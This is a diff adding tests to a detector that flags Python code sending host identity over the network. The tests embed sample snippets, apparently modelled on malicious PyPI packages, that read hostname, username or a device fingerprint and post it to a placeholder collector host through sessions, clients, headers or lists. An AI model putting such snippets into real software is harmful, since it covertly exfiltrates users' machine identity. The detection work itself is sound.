@@ -129,6 +129,102 @@ class TestAcrossFunctions:
         assert Flow.sent(source) == []
 
 
+class TestThroughAClientAndAContainer:
+    """Group A (a), 2026-11-10: 13 of 17 PyPI units sent what they gathered through an HTTP
+    client object, or a payload built a key at a time, and no flow fact fired."""
+
+    URL = "'https://collector.example.invalid/x'"
+
+    def test_a_session_sends_it(self):
+        source = (
+            "import requests, socket\n"
+            "s = requests.Session()\n"
+            f"s.post({self.URL}, json={{'h': socket.gethostname()}})\n"
+        )
+        assert Flow.sent(source) == ["identity sent: requests.Session.post"]
+
+    def test_a_client_opened_with_with_sends_it(self):
+        source = (
+            "import getpass, httpx\n"
+            "async def go():\n"
+            "    async with httpx.AsyncClient() as client:\n"
+            f"        await client.post({self.URL}, json={{'u': getpass.getuser()}})\n"
+        )
+        assert Flow.sent(source) == ["identity sent: httpx.AsyncClient.post"]
+
+    def test_a_client_made_by_a_helper_and_kept_on_self_after_five_steps(self):
+        # tsshare 1.0.2's shape: platform.node -> fingerprint helpers -> a hash -> self -> payload
+        source = (
+            "import hashlib, platform, requests\n"
+            "def _session():\n"
+            "    s = requests.Session()\n"
+            "    return s\n"
+            "def _linux():\n"
+            "    return platform.node() + '-' + platform.machine()\n"
+            "def _fingerprint():\n"
+            "    return _linux()\n"
+            "def _device():\n"
+            "    raw = _fingerprint()\n"
+            "    return hashlib.sha256(raw.encode()).hexdigest()\n"
+            "class Client:\n"
+            "    def __init__(self):\n"
+            "        self._session = _session()\n"
+            "        self._id = None\n"
+            "    def device(self):\n"
+            "        if self._id is None:\n"
+            "            self._id = _device()\n"
+            "        return self._id\n"
+            "    def query(self, name):\n"
+            "        payload = {'api': name, 'device': self.device()}\n"
+            f"        return self._session.post({self.URL}, json=payload)\n"
+        )
+        assert Flow.sent(source) == ["identity sent: requests.Session.post"]
+
+    def test_a_header_filled_a_key_at_a_time(self):
+        # apkeep 1.0.1's shape
+        source = (
+            "import socket, httpx\n"
+            "def headers():\n"
+            "    h = {'Accept': 'application/json'}\n"
+            "    h['X-Host'] = socket.gethostname()\n"
+            "    return h\n"
+            "def fetch():\n"
+            "    with httpx.Client() as client:\n"
+            f"        return client.get({self.URL}, headers=headers())\n"
+        )
+        assert Flow.sent(source) == ["identity sent: httpx.Client.get"]
+
+    def test_a_list_appended_to_and_sent(self):
+        source = (
+            "import getpass, requests\n"
+            "parts = []\n"
+            "parts.append(getpass.getuser())\n"
+            f"requests.post({self.URL}, data=','.join(parts))\n"
+        )
+        assert Flow.sent(source) == ["identity sent: requests.post"]
+
+    def test_a_session_sending_only_a_query_is_not(self):
+        source = (
+            "import platform, requests\n"
+            "s = requests.Session()\n"
+            "s.headers['User-Agent'] = 'client/1.0'\n"
+            "print(platform.node())\n"
+            f"s.get({self.URL}, params={{'q': 'weather'}})\n"
+        )
+        assert Flow.sent(source) == []
+
+    def test_a_container_filled_with_settings_only_is_not(self):
+        source = (
+            "import socket, requests\n"
+            "h = {}\n"
+            "h['Accept'] = 'application/json'\n"
+            "name = socket.gethostname()\n"
+            "print(name)\n"
+            f"requests.get({self.URL}, headers=h)\n"
+        )
+        assert Flow.sent(source) == []
+
+
 class TestNamesResolvePerScope:
     def test_a_copy_of_the_environment_in_another_function_is_not_what_is_sent(self):
         source = (
